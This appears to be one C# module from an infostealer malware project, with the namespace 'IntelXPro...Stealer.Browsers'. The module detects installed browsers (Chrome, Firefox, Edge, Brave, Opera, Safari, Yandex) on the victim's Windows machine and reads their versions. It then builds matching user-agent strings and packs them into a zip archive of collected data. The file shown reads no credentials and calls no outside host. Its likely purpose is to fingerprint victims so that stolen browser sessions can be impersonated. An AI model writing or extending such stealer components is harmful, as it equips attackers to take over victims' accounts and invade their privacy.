using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Browsers
{
    internal class UserAgentGenerator : ITarget
    {
        private class BrowserAgent
        {
            public string Name { get; set; }

            public string UserAgent { get; set; }
        }

        private readonly string[] paths = new string[7]
        {
        "C:\\Program Files\\Opera\\launcher.exe",
        "C:\\Program Files\\Apple\\Safari\\Safari.exe",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
        "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Yandex\\YandexBrowser\\Application\\browser.exe"
        };

        private readonly string[] names = new string[7] { "Opera", "Safari", "Firefox", "Chrome", "Edge", "Brave", "Yandex" };

        public void Collect(InMemoryZip zip, Counter counter)
        {
            string version = WindowsInfo.GetVersion();
            string architecture = WindowsInfo.GetArchitecture();
            List<BrowserAgent> list = new List<BrowserAgent>();
            for (int i = 0; i < paths.Length; i++)
            {
                string text = ((names[i] == "Chrome") ? GenerateUserAgentChrome(paths[i], version, architecture) : GenerateUserAgent(paths[i], names[i], version, architecture));
                if (!string.IsNullOrEmpty(text))
                {
                    list.Add(new BrowserAgent
                    {
                        Name = names[i],
                        UserAgent = text
                    });
                }
            }
            if (list.Count != 0)
            {
                int maxName = Math.Max("Browser".Length, list.Max((BrowserAgent a) => a.Name.Length));
                int maxUA = Math.Max("User-Agent".Length, list.Max((BrowserAgent a) => a.UserAgent.Length));
                List<string> list2 = new List<string>
            {
                "Browser".PadRight(maxName) + " | " + "User-Agent".PadRight(maxUA),
                new string('-', maxName + maxUA + 3)
            };
                list2.AddRange(list.Select((BrowserAgent a) => a.Name.PadRight(maxName) + " | " + a.UserAgent.PadRight(maxUA)));
                zip.AddTextFile("UserAgents.txt", string.Join(Environment.NewLine, list2));
            }
        }

        private string GenerateUserAgent(string browserPath, string name, string osVersion, string architecture)
        {
            if (File.Exists(browserPath))
            {
                return "Mozilla/5.0 (Windows NT " + osVersion + "; " + architecture + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36 " + name + "/" + GetBrowserVersion(browserPath);
            }
            return string.Empty;
        }

        private string GenerateUserAgentChrome(string browserPath, string osVersion, string architecture)
        {
            if (!File.Exists(browserPath))
            {
                return string.Empty;
            }
            string browserVersion = GetBrowserVersion(browserPath);
            return "Mozilla/5.0 (Windows NT " + osVersion + "; " + architecture + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + browserVersion + " Safari/537.36";
        }

        private string GetBrowserVersion(string browserPath)
        {
            if (!File.Exists(browserPath))
            {
                return "Unknown";
            }
            return FileVersionInfo.GetVersionInfo(browserPath).FileVersion;
        }
    }
}
